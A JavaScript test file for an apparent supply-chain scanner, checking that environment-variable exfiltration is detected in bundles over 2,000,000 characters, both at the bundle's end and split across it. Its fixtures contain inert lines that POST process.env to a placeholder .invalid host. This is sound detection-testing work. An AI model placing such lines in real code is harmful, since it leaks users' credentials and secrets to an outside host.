// BIG-BUNDLE-TAIL (0.1.9): a big text's tail is read. The supply-chain tree reads a text up to 16,000,000 characters
// (the largest source file the scans read; it read 2,000,000), so an exfiltration at the end of a bundle past
// 2,000,000 (where ncc puts an action's own code), or split across it (a helper that returns the data, the call that
// sends it a megabyte later), is found; and the text follower, which answers where the tree cannot (a text the parser
// refuses), reads a text whole, a limit it meets before the text's end making the file SC-TRUNCATED in the limit's
// words (big-bundle-tail-limits.test.js). Twin of python/tests/registry/test_big_bundle_tail*.py and of the engine's
// flow_tail_tests.rs. Inert text only: nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { importTimeRisk } from "../src/lib/native.js";

const HARVEST = "reads credentials or the whole environment and sends data over the network";
const SEND = 'fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });\n';

const module = (k, code = null) => `/***/ ${k}:\n/***/ ((module, exports, __nccwpck_require__) => {\n\n"use strict";\n${
  code ?? `function normalize${k}(options) {\n  options = options || {};\n  const result = { retries: options.retries || 3, name: "m${k}" };\n  return result;\n}\n`
  + `class Client${k} {\n  constructor(base) { this.base = base; this.options = normalize${k}({ retries: ${k % 7} }); }\n`
  + `  path(p) { return this.base + "/" + p.split("/").filter((s) => s.length > 0).map((s) => encodeURIComponent(s)).join("/"); }\n}\n`
  + `const cache${k} = new Map();\nfunction lookup${k}(key) { if (cache${k}.has(key)) return cache${k}.get(key); const v = key + ${k}; cache${k}.set(key, v); return v; }\n`
  + `module.exports = { Client${k}, lookup${k}, normalize${k} };\n`}\n/***/ }),\n\n`;

/** A bundle past 2,000,000 characters: benign modules, `code` among them at `at` (0: its start, 1: its end), `main`
 * after the module table, `helper` in its core module (9001), the first. */
function bundle({ code = null, at = 0, main = "", helper = "" } = {}) {
  const mods = [];
  let n = 0;
  while (n < 2_100_000) { mods.push(module(10_000 + mods.length)); n += mods[mods.length - 1].length; }
  if (code !== null) mods.splice(Math.min(Math.floor(mods.length * at), mods.length), 0, module(99, code));
  mods.unshift(module(9001, 'exports.info = function info(m) { return m.length; };\n' + helper));
  return "var __webpack_modules__ = ({\n\n" + mods.join("") + "});\nvar __webpack_module_cache__ = {};\n"
    + "function __nccwpck_require__(id) { var c = __webpack_module_cache__[id]; if (c !== undefined) return c.exports;"
    + " var m = __webpack_module_cache__[id] = { exports: {} }; __webpack_modules__[id](m, m.exports, __nccwpck_require__);"
    + " return m.exports; }\n(() => {\nconst core = __nccwpck_require__(9001);\nasync function run() {\n" + main
    + "  core.info(\"done\");\n}\nrun();\n})();\n";
}

test("an exfiltration in a bundle past 2,000,000 characters is found: at its end, and split", () => {
  const end = bundle({ main: "  " + SEND });
  assert.ok(end.length > 2_000_000);
  assert.deepEqual(importTimeRisk(end, "js")[0], [HARVEST], "at its end");
  const split = bundle({
    helper: "exports.diag = function diag() { const all = JSON.stringify(process.env); return all; };\n",
    code: 'const core = __nccwpck_require__(9001);\n(async () => {\n  await fetch("https://c.invalid/x", { method: "POST", body: core.diag() });\n})();\n',
    at: 0.48
  });
  assert.ok(split.indexOf("core.diag()") - split.indexOf("exports.diag") > 950_000);
  assert.deepEqual(importTimeRisk(split, "js")[0], [HARVEST], "split");
});

test("a big benign bundle is read whole: nothing found, nothing unread", () => {
  assert.deepEqual(importTimeRisk(bundle(), "js"), [[], null]);
});
